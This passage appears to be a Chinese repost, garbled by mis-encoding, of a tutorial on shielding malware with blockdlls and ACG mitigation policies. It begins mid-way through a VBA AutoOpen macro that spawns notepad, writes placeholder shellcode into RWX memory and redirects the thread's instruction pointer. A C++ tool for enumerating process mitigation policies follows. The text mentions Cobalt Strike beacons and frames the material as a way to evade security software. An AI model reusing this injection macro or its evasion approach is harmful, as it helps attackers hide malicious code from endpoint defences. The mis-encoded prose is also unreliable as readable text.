LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON ' and PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1010 ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's and disallow dynamic code result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, as this isn't blocked from alloc outside the process (and ... yolo)) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For Offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(Offset) result = WriteProcessMemory(pi.hProcess, alloc + Offset, myByte, 1, ByVal 0&amp;) Next Offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>æ‰€ä»¥è¿™å¯¹äºä¿æŠ¤æˆ‘ä»¬æ­£åœ¨æ´¾ç”Ÿçš„è¿›ç¨‹æ˜¯å¾ˆå¥½çš„ï¼Œä½†æ˜¯å¦‚æœå½“æˆ‘ä»¬æƒ³å°†ä¸€äº›ä»£ç æ³¨å…¥ä¸€ä¸ªå·²ç»è¢«ACGä¿æŠ¤çš„è¿›ç¨‹æ—¶å‘¢ï¼Ÿæˆ‘å¬åˆ°çš„ä¸€ä¸ªå¸¸è§çš„è¯¯è§£æ˜¯ï¼Œæˆ‘ä»¬æ— æ³•å°†ä»£ç æ³¨å…¥åˆ°å—ACGä¿æŠ¤çš„è¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æŸç§å½¢å¼çš„å¯å†™å’Œå¯æ‰§è¡Œçš„å†…å­˜ã€‚ä½†å®é™…ä¸Šï¼ŒACGå¹¶ä¸é˜»æ­¢è¿œç¨‹è¿›ç¨‹è°ƒç”¨VirtuAllocExç­‰å‡½æ•°ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸€äº›ç®€å•çš„shellcodeå»æ´¾ç”Ÿå‡ºcmd.exeï¼Œå¹¶å°†å…¶æ³¨å…¥åˆ°ACGä¿æŠ¤çš„è¿›ç¨‹ä¸­ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24065b9494f84f0c932a071a31a58cc2><p class=pgc-img-caption></p></div><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼ŒCobalt Strikeçš„beaconç›®å‰æ— æ³•ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå› ä¸ºä¾èµ–å‘RWXåˆ†é…å’Œä¿®æ”¹å†…å­˜é¡µã€‚æˆ‘å°è¯•äº†ä¸€äº›ä¸åŒçš„å¯æ‰©å±•é…ç½®æ–‡ä»¶é€‰é¡¹æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆä¸»è¦å’Œuserwxæœ‰å…³çš„é€‰é¡¹ï¼‰ï¼Œä½†ç›®å‰çœ‹æ¥ä¸è¡Œã€‚</p><h1>æ“ä½œäº‹é¡¹</h1><p>ç°åœ¨ï¼Œæˆ‘ä»¬è¦å°†è¿™äº›ç­–ç•¥è¿›è¡Œæ•´åˆã€‚ä¾‹å¦‚ï¼Œåœ¨å¼€å§‹ç”Ÿæˆä»»æ„è¿›ç¨‹æ—¶ï¼Œå¯ä»¥ç”¨PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONè¿›è¡Œä¿æŠ¤ã€‚</p><p>æˆ‘ä»¬è¿˜å¸Œæœ›ç”¨æŸä¸ªç­–ç•¥æšä¸¾å‡ºæ‰€æœ‰çš„è¿›ç¨‹ã€‚é€šè¿‡Powershellå‘½ä»¤Get-ProcessMigrationï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ³¨å†Œè¡¨ä¸­å®šä¹‰çš„æ‰€æœ‰ç­–ç•¥ï¼Œè€Œä¸”æˆ‘ä»¬ä¹ŸçŸ¥é“è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å¯¹è¿›ç¨‹è¿›è¡Œä¿æŠ¤ï¼Œä¾‹å¦‚setMigrationPolicy APIï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡CreateProcessAç”Ÿæˆä»»æ„è¿›ç¨‹ã€‚</p><p>ä¸ºäº†ç¡®ä¿æ­£ç¡®åœ°åˆ†ææ¯ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç®€å•çš„å·¥å…·ï¼Œå¦‚ä¸‹å·¥å…·å°†ä½¿ç”¨GetProcessMitigationPolicyæ¥è¯†åˆ«ç­–ç•¥çš„åˆ†é…ï¼š</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;processthreadsapi.h&gt;bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);void GetProtection(int pid, const char *exe) { PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy; PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signaturePolicy; HANDLE pHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid); if (pHandle == INVALID_HANDLE_VALUE) { printf("[!] Error opening handle to %d\n", pid); return; } // Actually retrieve the mitigation policy for ACG if (!GetProcessMitigationPolicy(pHandle, ProcessDynamicCodePolicy, &amp;dynamicCodePolicy, sizeof(dynamicCodePolicy))) { printf("[!] Could not enum PID %d [%d]\n", pid, GetLastError()); return; } if (dynamicCodePolicy.ProhibitDynamicCode) { printf("[%s] - ProhibitDynamicCode\n", exe); } if (dynamicCodePolicy.AllowRemoteDowngrade) { printf("[%s] - AllowRemoteDowngrade\n", exe); } if (dynamicCodePolicy.AllowThreadOptOut) { printf("[%s] - AllowThreadOptOut\n", exe); } // Retrieve mitigation policy for loading arbitrary DLLs if (!GetProcessMitigationPolicy(pHandle, ProcessSignaturePolicy, &amp;signaturePolicy, sizeof(signaturePolicy))) { printf("Could not enum PID %d\n", pid); return; } if (signaturePolicy.AuditMicrosoftSignedOnly) { printf("[%s] AuditMicrosoftSignedOnly\n", exe); } if (signaturePolicy.AuditStoreSignedOnly) { printf("[%s] - AuditStoreSignedOnly\n", exe); } if (signaturePolicy.MicrosoftSignedOnly) { printf("[%s] - MicrosoftSignedOnly\n", exe); } if (signaturePolicy.MitigationOptIn) { printf("[%s] - MitigationOptIn\n", exe); } if (signaturePolicy.StoreSignedOnly) { printf("[%s] - StoreSignedOnly\n", exe); }}int main(){ HANDLE snapshot; PROCESSENTRY32 ppe; HANDLE accessToken; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;accessToken)) { printf("[!] Error opening process token\n"); return 1; } // Provide ourself with SeDebugPrivilege to increase our enumeration chances SetPrivilege(accessToken, SE_DEBUG_NAME); // Prepare handle to enumerate running processes snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf("[!] Error: CreateToolhelp32Snapshot\n"); return 2; } ppe.dwSize = sizeof(PROCESSENTRY32); Process32First(snapshot, &amp;ppe); do { // Enumerate process mitigations GetProtection(ppe.th32ProcessID, ppe.szExeFile); } while (Process32Next(snapshot, &amp;ppe));}bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) { TOKEN_PRIVILEGES tp; LUID luid; if (!LookupPrivilegeValue( NULL, lpszPrivilege, &amp;luid)) { printf("[!] LookupPrivilegeValue error: %u\n", GetLastError()); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges( hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) { printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError()); return FALSE; } return TRUE;}</pre><p>ç»è¿‡æˆ‘å¯¹Windows 10çš„æµ‹è¯•ï¼Œå‘ç°å·²æœ‰å‡ ä¸ªè¿›ç¨‹åº”ç”¨äº†å®‰å…¨ç­–ç•¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿æŠ¤ä½ çš„æ¶æ„è½¯ä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/0942282201f74b329b2692a6ac84cc21><p class=pgc-img-caption></p></div><p>è¿™äº›è¿›ç¨‹ä¸»è¦å›´ç»•Edgeã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿæœ‰è®¸å¤šå…¶ä»–é€‰æ‹©ï¼Œä¾‹å¦‚fontdrvhost.exeå’Œdllhost.exeã€‚</p><p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™ä½ åœ¨æ¸—é€æµ‹è¯•æœŸé—´èº²é¿å®‰å…¨è½¯ä»¶çš„æ£€æµ‹æä¾›ä¸€äº›æ€è·¯ã€‚</p><p>æœ¬æ–‡ç”±ç™½å¸½æ±‡æ•´ç†å¹¶ç¿»è¯‘ï¼Œä¸ä»£è¡¨ç™½å¸½æ±‡ä»»ä½•è§‚ç‚¹å’Œç«‹åœº</p><p>æ¥æºï¼šhttps://nosec.org/home/detail/3131.html</p><p>åŸæ–‡ï¼šhttps://blog.xpnsec.com/protecting-your-malware/</p><p>ç™½å¸½æ±‡ä»äº‹ä¿¡æ¯å®‰å…¨ï¼Œä¸“æ³¨äºå®‰å…¨å¤§æ•°æ®ã€ä¼ä¸šå¨èƒæƒ…æŠ¥ã€‚</p><p>å…¬å¸äº§å“ï¼šFOFA-ç½‘ç»œç©ºé—´å®‰å…¨æœç´¢å¼•æ“ã€FOEYE-ç½‘ç»œç©ºé—´æ£€ç´¢ç³»ç»Ÿã€NOSEC-å®‰å…¨è®¯æ¯å¹³å°ã€‚</p><p>ä¸ºæ‚¨æä¾›ï¼šç½‘ç»œç©ºé—´æµ‹ç»˜ã€ä¼ä¸šèµ„äº§æ”¶é›†ã€ä¼ä¸šå¨èƒæƒ…æŠ¥ã€åº”æ€¥å“åº”æœåŠ¡ã€‚</p></div></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'blockdlls','ACG','ä¿æŠ¤'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>